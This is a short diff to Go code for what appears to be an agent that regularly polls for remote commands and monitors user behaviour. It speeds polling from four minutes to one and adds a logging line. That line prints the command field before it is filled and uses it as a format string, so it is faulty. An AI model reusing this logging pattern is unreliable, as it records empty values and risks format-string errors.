@@ -747,7 +747,7 @@ func (p *Program) monitorUserBehavior(agentID string) {
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 func (p *Program) Getcommand(agentid string) {
-    ticker := time.NewTicker(4 * time.Minute)
+    ticker := time.NewTicker(1 * time.Minute)
     defer ticker.Stop()
 
     for {
@@ -769,6 +769,7 @@ func (p *Program) Getcommand(agentid string) {
 
             var response Response
             var command Command
+            log.Printf(command.Command)
             if err := json.Unmarshal(body, &response); err != nil {
                 log.Printf("Failed to unmarshal command: %v", err)
                 continue
